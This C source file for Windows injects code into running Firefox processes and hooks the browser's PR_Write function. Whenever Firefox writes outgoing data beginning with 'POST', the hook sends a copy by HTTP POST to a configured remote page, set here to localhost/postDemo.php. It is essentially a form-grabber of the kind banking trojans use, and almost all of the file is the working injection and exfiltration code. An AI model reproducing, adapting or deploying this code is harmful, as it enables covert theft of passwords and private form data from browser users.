#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <Tlhelp32.h>
#include <wininet.h>
#include <tchar.h>

// Based on http://www.rohitab.com/discuss/topic/36911-cfirefox-pr-write-hook/

#define HTTP_PORT			80
#define HTTP_POST			"POST"
#define HTTP_POST_HEADER	"Content-Type:application/x-www-form-urlencoded"
#define HTTP_REMOTE_SITE	"localhost"
#define HTTP_REMOTE_PAGE	"/postDemo.php"

#define FIREFOX_PROCESS		TEXT("firefox.exe")
#define FIREFOX_PR_WRITE	"PR_Write"
#define NSPR4_DLL			"nspr4.dll"
#define WININET_DLL			"wininet.dll"
#define KERNEL32_DLL		"kernel32.dll"

#define HOOK_CODE_SIZE			2000
#define HOOK_ESP_DATA_OFFSET	0x08
#define HOOK_ESP_DATA_SIZE		0x0C
#define HOOK_ESP_ARG_0			0x04
#define HOOK_POST_CMP			0x54534F50		// = TSOP (POST)
#define HOOK_JMP				0xE9			// Jump near, relative, displacement relative to next instruction
#define HOOK_INT3				0xCC
#define HOOK_JMP_INST_SIZE		0x01
#define HOOK_INT3_SIZE			0x01
#define HOOK_ADDRESS_SIZE_32	0x04
#define HOOK_ADDRESS_SIZE_64	0x08
#define HOOK_REL_JMP_OFFSET_32	(HOOK_JMP_INST_SIZE + HOOK_ADDRESS_SIZE_32)		// 5
#define HOOK_REL_JMP_OFFSET_64	(HOOK_JMP_INST_SIZE + HOOK_ADDRESS_SIZE_64)		// 9
#define HOOK_PARAM1_OFFSET_32	0x08
#define HOOK_LOCALVAR1_OFFSET_32 0x04 // Should be 

#define PR_WRITE_JMP_VP_SIZE	0x06	// 0x0A for 64 bits

typedef HMODULE (WINAPI *FnGetModuleHandle) (LPCTSTR);
typedef FARPROC (WINAPI *FnGetProcAddress) (HMODULE,LPCSTR);
typedef int (WINAPI *FnVirtualProtect) (LPVOID,SIZE_T,DWORD,PDWORD);
typedef HINTERNET (WINAPI *FnInternetOpen) (LPCTSTR,DWORD,LPCTSTR,LPCTSTR,DWORD);
typedef HINTERNET (WINAPI *FnInternetConnect)(HINTERNET,LPCTSTR,INTERNET_PORT,LPCTSTR,LPCTSTR,DWORD,DWORD,DWORD_PTR);
typedef HINTERNET (WINAPI *FnHttpOpenRequest) (HINTERNET,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR*,DWORD,DWORD_PTR);
typedef BOOL (WINAPI *FnHttpSendRequest)(HINTERNET,LPCTSTR,DWORD,LPVOID,DWORD);
typedef VOID (WINAPI *FnSleep)(DWORD);

typedef struct {
	FnGetModuleHandle fnGetModuleHandle;	// GetModuleHandle
	FnGetProcAddress fnGetProcAddress;		// GetProcAddress
	FnVirtualProtect fnVirtualProtect;		// VirtualProtect
	FnSleep fnSleep;						// Sleep
	char nameNspr4[36];						// "nspr4.dll" 
	char namePR_Write[36];					// "PR_Write"
	BYTE *PR_Write;
	BYTE *nptr;
	DWORD *bptr;
	DWORD oldProtectValue;
	char blank[3];							// ""
	char remoteSite[16];					// "localhost"
	char post[10];							// "POST"
	char pageName[16];						// "/visit.php"
	char header[64];						// "Content-Type:application/x-www-form-urlencoded"
	HINTERNET fnOpenHandle;
	HINTERNET fnConnectHandle;
	HINTERNET internetHandle;
	int postDataLength;
	char *pPostData;			
	FnInternetOpen fnInternetOpen;
	FnInternetConnect fnInternetConnect;
	FnHttpOpenRequest fnHttpOpenRequest;
	FnHttpSendRequest fnHttpSendRequest;
	int addressSize;						// 4, or 8 on 64 bit CPUs
} InjectData;

void Hook(InjectData *pData);
int main() {

	InjectData data; 
	LPVOID pRemoteProgram, pRemoteMemory;
	HANDLE rThread;
	HMODULE kernel32;
	HMODULE wininet;

	HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); 
	PROCESSENTRY32 ProcessInfo;
	ProcessInfo.dwSize = sizeof(PROCESSENTRY32);  

	LoadLibraryA( WININET_DLL );
	wininet = GetModuleHandleA( WININET_DLL );
	kernel32 = GetModuleHandleA( KERNEL32_DLL );
	data.fnGetModuleHandle		= (FnGetModuleHandle) GetProcAddress( kernel32,"GetModuleHandleA" );
	data.fnGetProcAddress		= (FnGetProcAddress) GetProcAddress(  kernel32,	"GetProcAddress" );
	data.fnVirtualProtect		= (FnVirtualProtect) GetProcAddress(  kernel32,	"VirtualProtect" );
	data.fnSleep				= (FnSleep) GetProcAddress(			  kernel32,	"Sleep" );
	data.fnInternetOpen			= (FnInternetOpen) GetProcAddress(	  wininet,	"InternetOpenA" ); 
	data.fnInternetConnect					= (FnInternetConnect) GetProcAddress( wininet,	"InternetConnectA" );
	data.fnHttpOpenRequest		= (FnHttpOpenRequest) GetProcAddress( wininet,	"HttpOpenRequestA" );
	data.fnHttpSendRequest		= (FnHttpSendRequest) GetProcAddress( wininet,	"HttpSendRequestA" ); 
	strcpy( data.nameNspr4,		NSPR4_DLL );
	strcpy( data.namePR_Write,	FIREFOX_PR_WRITE );
	strcpy( data.remoteSite,		HTTP_REMOTE_SITE );
	strcpy( data.post,			HTTP_POST );
	strcpy( data.pageName,		HTTP_REMOTE_PAGE);
	strcpy( data.header,			HTTP_POST_HEADER );
	strcpy( data.blank,			"");
	data.addressSize			= sizeof( BYTE * );	// size  of a pointer

	while(Process32Next(handle, &ProcessInfo))
	{
		// strcmp on ANSI, wcscmp on UNICODE
		if(! _tcscmp(ProcessInfo.szExeFile, FIREFOX_PROCESS))
		{
			HANDLE firefoxHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessInfo.th32ProcessID);
            
			pRemoteMemory = VirtualAllocEx( firefoxHandle, NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
			WriteProcessMemory(firefoxHandle, pRemoteMemory, &data, sizeof(data), NULL);
             
			pRemoteProgram = VirtualAllocEx( firefoxHandle, NULL, HOOK_CODE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
			WriteProcessMemory(firefoxHandle, pRemoteProgram, Hook, HOOK_CODE_SIZE, NULL);
                                  
			rThread = CreateRemoteThread( firefoxHandle, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteProgram, pRemoteMemory, 0 ,NULL); 
			WaitForSingleObject( rThread, INFINITE);
			CloseHandle(firefoxHandle);
		}
	}

	return 0;
}

void Hook( InjectData *pData ) {

	BYTE *temp;

	goto start;

Hooked:

	__asm{
		mov ecx, [esp + HOOK_ESP_DATA_SIZE]	// param data size
		mov eax, [esp + HOOK_ESP_DATA_OFFSET]// param data

		cmp dword ptr[eax], HOOK_POST_CMP // POST?
		jne prexJMP						// it is not POST
										// it is POST
		sub esp, HOOK_PARAM1_OFFSET_32	// Alloc space for pData
										// this avoids overwriting PR_Write params with Hook param pData
										// See http://www.unixwiz.net/techtips/win32-callconv-asm.html
		push ebp						// Save ebp register
		mov ebp, esp					// Place ebp at esp
		sub esp, HOOK_LOCALVAR1_OFFSET_32 	// Alloc 4 bytes on stack for temp local variable
		push ecx						// save param data size
		push eax						// save param data
		call getDelta4					// get the delta, &newtInstruction follows this call
	getDelta4:
		pop ecx							// return from call, saving the address at ecx
		sub ecx, offset getDelta4
		lea eax, data
		add eax, ecx					// eax = &data + (&nextInstruction - &getDelta4) = &data
		mov eax,[eax]
		mov pData, eax					// pData = *eax = *(&nextInstruction +(&data - &getDelta4))
		pop eax				
		mov temp,eax					// temp = param data
	}

	pData->pPostData = (char*)temp;		// save data
	__asm{ 
		nop 
		pop ecx							// ecx = param data size
		mov temp,ecx
		nop 
	}
	pData->postDataLength = (int)temp;	// save data length
	__asm{ nop }
	
	// TODO check for NULL values
	// Connect to the remote site
	pData->internetHandle = pData->fnInternetConnect( pData->fnOpenHandle, pData->remoteSite, HTTP_PORT, pData->blank, pData->blank, INTERNET_SERVICE_HTTP, 0, 0);
	// Create an HTTP request containing the post data
    pData->fnConnectHandle = pData->fnHttpOpenRequest( pData->internetHandle, pData->post, pData->pageName, NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0);
	// Send the request, post data is zero terminated (-1L)
	pData->fnHttpSendRequest( pData->fnConnectHandle, pData->header, -1L, pData->pPostData, pData->postDataLength );

	__asm{ 
		nop
		add esp, HOOK_LOCALVAR1_OFFSET_32	
		pop ebp							// reset state of ebp and esp
		add esp, HOOK_PARAM1_OFFSET_32
		nop
	}

prexJMP:
	__asm{
		// Execute the 2 instructions that were overwritten by the JMP LOC instruction (TOTAL = 6 bytes on 32 bit machines, 10 bytes on 64 bit machines ???????)
		MOV EAX, DWORD PTR [ESP + HOOK_ESP_ARG_0]
		MOV ECX, DWORD PTR [EAX] 
	}
xJMP:
	__asm{ jmp ExitProcess }
data:
	// Will contain pData (pointer size = 4 bytes, or 8 bytes for 64 bits CPUs). See: A.0.0
	__asm{ 
		nop
		nop
		nop
		nop

/*		nop
		nop
		nop
		nop*/
	}

start:
	// Retrieve PR_Write address
	pData->PR_Write = (BYTE*) pData->fnGetProcAddress( pData->fnGetModuleHandle(pData->nameNspr4), pData->namePR_Write );
	// PR_Write can be executed as a function
	pData->fnVirtualProtect( pData->PR_Write, PR_WRITE_JMP_VP_SIZE, PAGE_EXECUTE_READWRITE, &pData->oldProtectValue );

	__asm{ 
		push ecx				// save ecx
		call getDelta  
	getDelta: 
		pop ecx					// ecx = return address (previous call)
		sub ecx,offset getDelta 
		push eax				// save eax
		lea eax, Hooked 
		add eax, ecx 
		mov temp, eax			// temp = &Hooked + (&returnAddress - &getDelta)
		pop eax					// retrieve eax
		pop ecx					// retrieve ecx
	}

	pData->nptr = temp;					
	pData->nptr = (BYTE*)(pData->nptr - pData->PR_Write);
	pData->nptr = pData->nptr - HOOK_REL_JMP_OFFSET_32;	// nptr = &Hooked - 5 relative to PR_Write

	*pData->PR_Write = HOOK_JMP;		// Replace PR_Write first instruction by a JMP
		
	// This line will crash firefox
	// avoid doing + n to a pointer. Compiler fault ?
	// *(pData->PR_Write + 1) = (DWORD) pData->nptr;
		
	// The following code 
	// JMP relativeAddress	( size = 1 + 4 (or 8) )
	// INT 3				( size = 1 )
	// --> TOTAL SIZE = 6 bytes (or 10 bytes for 64 bit CPUs)
	// ---- replaces
	// mov     eax, [esp+arg_0]	(size = 4 (or 8) )
	// mov     ecx, [eax]		(size = 1)
	// --> TOTAL_SIZE = 6 bytes (or 10 bytes for 64 bit CPUs)
        
	pData->PR_Write		+= HOOK_JMP_INST_SIZE;
    pData->bptr			= (DWORD*) pData->PR_Write;	
    *pData->bptr		= (DWORD) pData->nptr;		// JMP to &Hooked --> relative to next instruction @ PR_Write + 4 + 1

	//pData->PR_Write		= pData->PR_Write + HOOK_ADDRESS_SIZE_32;
	pData->PR_Write	+= HOOK_ADDRESS_SIZE_32;
    *pData->PR_Write	= HOOK_INT3;				// Place a software breakpoint as the next instruction
	pData->PR_Write		+= HOOK_INT3_SIZE;

	__asm{ 
		push ecx				// save ecx
		call getDelta1  
	getDelta1: 
		pop ecx					// ecx = return address (previous call)
		sub ecx,offset getDelta1 
		push eax				// save eax
		lea eax, xJMP 
		add eax, ecx 
		mov temp, eax			// temp = &returnAddress +(&xJMP - &getDelta)
		pop eax					// retrieve eax
		pop ecx					// retrieve ecx
	}

	pData->nptr = temp;
	pData->PR_Write = (BYTE*)(pData->PR_Write - pData->nptr);		// point to instruction after INT 3, relative to &xJMP
	pData->PR_Write = pData->PR_Write - HOOK_REL_JMP_OFFSET_32;
//	pData->PR_Write = pData->PR_Write - pData->addressSize;			// Reduce offset of JMP + JMP_ADDRESS (1+4 bytes) <-- this fails
	pData->nptr ++;													// nptr point to ExitProcess
	// ExitProcess address can be executed
	pData->fnVirtualProtect(pData->nptr, 10, PAGE_EXECUTE_READWRITE, &pData->oldProtectValue);

	pData->bptr = (DWORD*) pData->nptr;			
	*pData->bptr = (DWORD) pData->PR_Write;		// ExitProcess = &originalPR_Write
	// JMP to the "original code" that follows the replaced code

	// Save pData in &data space
	temp = (BYTE *) pData;
	__asm{ 
		push ecx				// save ecx
		call getDelta2
	getDelta2: 
		pop ecx					// ecx = return address (previous call)
		sub ecx, offset getDelta2 
		push eax				// save eax
		push ebx				// save ebx
		lea eax, data 
		add eax, ecx			// eax = &data + ( &returnAddress - &getDelta )	
		mov ebx, temp 
		mov dword ptr[eax],ebx // data = pData !!!! (A.0.0)
		pop ebx 
		pop eax 
		pop ecx
	}

	// PR_Write can be executed as a function
	pData->fnVirtualProtect( pData, 4, PAGE_EXECUTE_READWRITE, &pData->oldProtectValue );


	// Open an internet connection to remoteSite with standard options. 
	// See http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx
	pData->fnOpenHandle = pData->fnInternetOpen( pData->remoteSite, INTERNET_OPEN_TYPE_PRECONFIG, NULL ,NULL, 0);

	// Everything is done in the PR_Write thread when called
	// for(;;) 
	// { 
	// 	pData->fnSleep(1000); 
	// }
		

}